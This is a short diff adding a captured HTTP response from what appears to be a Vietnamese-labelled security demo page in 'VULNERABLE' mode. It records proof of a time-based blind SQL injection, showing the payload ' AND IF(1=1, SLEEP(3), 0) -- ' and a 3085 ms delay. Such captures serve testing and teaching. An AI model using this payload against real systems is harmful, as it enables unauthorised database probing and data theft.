@@ -1,0 +1,18 @@
+### Time-based Blind SQL Injection Response: Proof of execution delay (> 3000ms)
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Wed, 16 Sep 2026 07:38:50 GMT
+Connection: keep-alive
+
+<!--
+Client-side measured latency: 3,085 ms (Network roundtrip + MySQL SLEEP(3))
+HTML meta-bar proves the elapsed execution time:
+-->
+<div class="meta-bar">
+    <span>Từ khóa: <strong>' AND IF(1=1, SLEEP(3), 0) -- </strong></span>
+    <span>Danh mục: <strong>ALL</strong></span>
+    <span>Chế độ: <span class="badge badge-danger">VULNERABLE</span></span>
+    <span>Thời gian phản hồi (Latency): <span class="time-highlight">3085 ms</span></span>
+</div>
